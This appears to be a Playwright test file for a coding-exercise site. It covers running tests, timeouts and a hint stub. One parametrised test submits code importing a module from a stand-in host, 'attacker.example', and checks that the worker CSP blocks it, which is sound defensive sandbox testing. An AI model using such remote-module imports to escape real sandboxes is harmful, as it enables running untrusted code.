import { test, expect } from "@playwright/test";

test("R2: open an exercise, run failing tests, see per-test results", async ({ page }) => {
  await page.goto("/exercises");
  await page.getByRole("link", { name: "Sum an array" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Sum an array" })).toBeVisible();

  await page.getByRole("button", { name: "Run tests" }).click();
  const results = page.getByTestId("results");
  await expect(results).toContainText("tests failing");
  await expect(results).toContainText("sum([1, 2, 3]) should be 6");
});

test("R1: passing code shows the complete state and marks the exercise solved", async ({ page }) => {
  await page.goto("/exercises/sum-array");
  await page.getByLabel("Your code (JavaScript)").fill(
    "function sum(n) { return n.reduce((a, b) => a + b, 0); }",
  );
  await page.getByRole("button", { name: "Run tests" }).click();
  await expect(page.getByRole("heading", { name: "Exercise complete" })).toBeVisible();
  await page.goto("/exercises");
  await expect(page.getByText("Solved", { exact: true })).toBeVisible();
});

test("R1: an infinite loop times out instead of hanging the page", async ({ page }) => {
  await page.goto("/exercises/sum-array");
  await page.getByLabel("Your code (JavaScript)").fill("function sum() { while (true) {} }");
  await page.getByRole("button", { name: "Run tests" }).click();
  await expect(page.getByTestId("results")).toContainText("Timed out", { timeout: 6000 });
});

test("N4: hint ladder stub lists five levels and has no enabled hint buttons", async ({ page }) => {
  await page.goto("/exercises/sum-array");
  const ladder = page.getByRole("region", { name: "Hint ladder" });
  await expect(ladder.getByRole("listitem")).toHaveCount(5);
  const first = ladder.getByRole("button").first();
  await expect(first).toHaveAttribute("aria-disabled", "true");
  await first.focus();
  await expect(first).toBeFocused();
});

for (const [label, target] of [
  ["external", "'https://attacker.example/m.js?x=1'"],
  ["same-origin", "location.origin + '/api/health?x=1'"],
] as const) {
  test(`R1: dynamic import of a ${label} module is blocked by the worker CSP`, async ({ page }) => {
    const responses: string[] = [];
    const requests: string[] = [];
    const failures: string[] = [];
    page.on("request", (r) => requests.push(r.url()));
    page.on("response", (r) => responses.push(r.url()));
    page.on("requestfailed", (r) => failures.push(`${r.url()} ${r.failure()?.errorText}`));
    await page.goto("/exercises/sum-array");
    await page
      .getByLabel("Your code (JavaScript)")
      .fill(`function sum() { import(${target}); return 0; }`);
    await page.getByRole("button", { name: "Run tests" }).click();
    await expect(page.getByTestId("results")).toBeVisible();
    await page.waitForTimeout(500);
    // No response may arrive for the import, and any attempt must fail with a CSP error.
    expect(responses.filter((u) => u.includes("x=1"))).toEqual([]);
    const attempted = requests.filter((u) => u.includes("x=1"));
    for (const u of attempted) {
      expect(failures.some((f) => f.startsWith(u) && f.toLowerCase().includes("csp"))).toBe(true);
    }
  });
}
